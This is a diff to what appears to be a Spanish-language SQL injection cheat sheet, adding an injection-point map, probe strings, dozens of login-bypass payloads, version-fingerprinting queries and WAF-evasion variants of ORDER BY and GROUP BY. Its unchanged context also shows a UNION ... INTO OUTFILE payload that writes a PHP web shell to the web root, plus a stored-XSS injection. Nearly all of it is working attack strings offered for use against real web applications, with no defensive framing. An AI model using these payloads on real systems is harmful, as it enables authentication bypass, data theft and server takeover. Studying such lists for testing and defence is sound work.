@@ -1,7 +1,26 @@
 # 🦕 ꧁𓊈SQL INJECTION𓊉꧂
 
-**`⃤⃞⃟⃤`** Sondas.
+**`⃤⃞⃟⃤`** Mapa de inyeccion.
+```bash
+Contexto     | Ejemplo usando una comilla
+--------------------------------------------
+Query string | ?id=1'...
+---------------------------------------------
+Path         | /users/1'...
+---------------------------------------------
+Form body    | username=admin'...
+---------------------------------------------
+JSON body    | {"username":"admin'..."}
+--------------------------------------------
+Cookie       | Cookie: uid=1'...
+--------------------------------------------
+Header       | X-Forwarded-For: 1'...
+---------------------------------------------
+GraphQL      | {"variables":{"id":"1'..."}}
+---------------------------------------------
+```
 
+**`⃤⃞⃟⃤`** Sondas.
 ```bash
 # Testing rapido. El 1 representa el numero o letra despues del parametro.
 ' " ) # || + >
@@ -10,10 +29,14 @@ ELT((1=1),1,2)
 1-IF(1=1,0,1)
 1-IF(1=2,0,1)
 1'
+%3f%00
 1"
 (1)and(1)=(1)--
 1\
+?\0
+?#\0 
 1)
+1' OR JSON_LENGTH(JSON_OBJECT('a',1))=1-- -
 1')
 1%00
 1%09%23
@@ -41,6 +64,46 @@ SELECT SLEEP(25)--
 1" OR "1"="1" --
 1' OR LENGTH(USER()) > 18 -- -
 1' OR 1=1 ORDER BY (SELECT IF(1=1, SLEEP(5), 0) FROM (SELECT 1) AS x LIMIT 1) -- -
+' AND JSON_LENGTH(JSON_OBJECT('a',1))=1 AND 1=1-- -
+' AND JSON_CONTAINS(JSON_OBJECT('a',1),JSON_OBJECT('a',1)) AND '1'='1-- -
+```
+**`⃤⃞⃟⃤`** Auth bypass.
+```bash
+# Cambiar el "#" por "--" o "-- -" si es necesario.
+admin' OR JSON_LENGTH(JSON_OBJECT('a',1))=1#
+admin' OR JSON_CONTAINS(JSON_OBJECT('u','admin'),JSON_OBJECT('u','admin'))#
+admin' OR JSON_TYPE(JSON_OBJECT('a',1))='OBJECT'#
+admin' OR JSON_EXTRACT(JSON_OBJECT('a',1),'$.a')=1#
+admin' OR JSON_OVERLAPS(JSON_ARRAY(1,2),JSON_ARRAY(2,3))#
+admin' OR JSON_EXISTS(JSON_OBJECT('a',1),'$.a')# 
+admin' OR 1 MEMBER OF(JSON_ARRAY(1,2))#
+' OR 1=1-- -
+' OR '1'='1'-- -
+' OR 1=1#
+' OR 1=1--+
+' OR 1=1;%00
+admin'-- -
+admin'#
+' OR 'a'='a'-- -
+' OR 2>1-- -
+' OR 1 LIKE 1-- -
+' OR 1 BETWEEN 1 AND 1-- -
+' OR 'a' IN ('a')-- -
+' OR 1=1 OR '
+' OR 1=1 OR 'x'='x
+' OR 1=1 OR ''='
+'/**/OR/**/1=1-- -
+'/*!50000OR*/1=1-- -
+' oR 1=1-- -
+' OR 1 LIKE 1-- -
+' OR 1 BETWEEN 1 AND 1-- -
+' OR 'a' IN ('a')-- -
+' || 1=1-- -
+' OR 2>1-- -
+%27%20OR%201%3D1--%20-
+%2527%2520OR%25201%253D1--%2520-
+'%09OR%091=1--%20-
+'%0AOR%0A1=1--%20-
 ```
 **`⃤⃞⃟⃤`** Cuando el servidor corta la comunicación.
 ```bash
@@ -57,6 +120,7 @@ SELECT SLEEP(25)--
 1' UNION SELECT @@version,USER(),DATABASE()# <<< para 3 columnas
 1' AND @@version LIKE '%MariaDB'%23
 1' UNION SELECT @@version_comment,@@version_compile_os,@@version_compile_machine# <<< para 3 columnas
+1' AND JSON_UNQUOTE(JSON_EXTRACT(JSON_OBJECT('v',@@version),'$.v')) LIKE '8.%'-- - <<< cambiar el numero
 ```
 **`⃤⃞⃟⃤`** Usuario y privilegios.
 ```bash
@@ -147,7 +211,7 @@ SELECT SLEEP(25)--
 1' UNION SELECT '<?php system($_GET[0]);?>',2,3 INTO OUTFILE '/var/www/html/shell.php'# 
 1'; UPDATE [TABLA] SET [COLUMNA]='<script>alert(1)</script>' WHERE id=5#
 ```
-**`⃤⃞⃟⃤`** WAF payloads (order by 10).
+**`⃤⃞⃟⃤`** WAF payloads (order by 10 y group by 10).
 ```bash
 # Mysql.
 1%09/*!30001ORDER*/%09/*!50611BY*/%0910#
@@ -157,6 +221,14 @@ SELECT SLEEP(25)--
 1%09/*!50708ORDER*/%09/*!40100BY*/%09510#
 1%0AorDER%0Aby%0A10%23
 1/**/ORDER/**/BY/**/10#
+1%09ORDER%23%0ABY%0910%23
+1%0D%0AORDER%0D%0ABY%0D%0A10%23
+1%0BORDER%0BBY%0B10%23
+1%0CORDER%0CBY%0C10%23
+1%20ORDER%20BY%2010%23
+1%09/*!50000ORDER*/%09/*!50000BY*/%0910%23
+1%09/*!50000ORDER*/%09/*!50000BY*/%0910--%20-
+1 oRdEr By 10-- -
 ------------------------------------------------------
 # MariaDB.
 1%09/*M!30001ORDER*/%09/*M!50611BY*/%0910# 
@@ -164,6 +236,22 @@ SELECT SLEEP(25)--
 1%09/*M!30001ORDER*/%09/*M!50611BY*/%0910#
 1%09/*M!50708ORDER*/%09/*M!30001BY*/%0910# 
 1%09/*M!50708ORDER*/%09/*M!40100BY*/%0910#
+1%09/*M!100100ORDER*/%09/*M!100100BY*/%0910%23
+1%09/*M!100600ORDER*/%09/*M!100600BY*/%0910%23
+1%0A/*M!100100ORDER*/%0A/*M!100100BY*/%0A10%23
+1%09ORDER%23%0ABY%0910%23
+1/**/ORDER/**/BY/**/10%23
+----------------------------------------------------------
+# Group.
+1 GROUP BY 10-- -
+1 GROUP BY 10#
+1 GROUP BY 1,2,3-- -
+1%09GROUP%09BY%0910%23
+1%09GROUP%23%0ABY%0910%23
+1%0AGROUP%0ABY%0A10%23
+1/**/GROUP/**/BY/**/10%23
+1%09/*!50000GROUP*/%09/*!50000BY*/%0910%23
+1 GROUP BY 10 WITH ROLLUP-- -
 ```
 **`⃤⃞⃟⃤`** WAF payloads (Union select 3 columnas).
 ```bash
